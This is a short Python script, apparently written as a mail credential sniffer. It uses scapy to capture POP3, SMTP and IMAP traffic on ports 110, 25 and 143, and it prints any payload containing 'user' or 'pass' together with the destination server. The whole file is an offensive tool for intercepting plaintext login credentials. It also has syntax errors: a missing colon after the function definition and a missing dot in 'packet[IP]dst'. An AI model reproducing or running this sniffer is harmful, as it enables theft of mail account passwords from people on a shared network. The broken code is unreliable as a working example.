# mail port sniffing code
from scapy.all import* 

def packet_call(packet)
	if packet[TCP].payload:
		mail_packet = str(packet[TCP].payload)
		
		
		if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
			print "  Server : %s " % packet[IP]dst
			
			print "[*] %s" % packet[TCP].payload
			
	# driving the sniffer code 		
			
sniff(filter = "tcp port 110 or tcp port 25 or tcp port 143" , prn = packet_call , store=0)
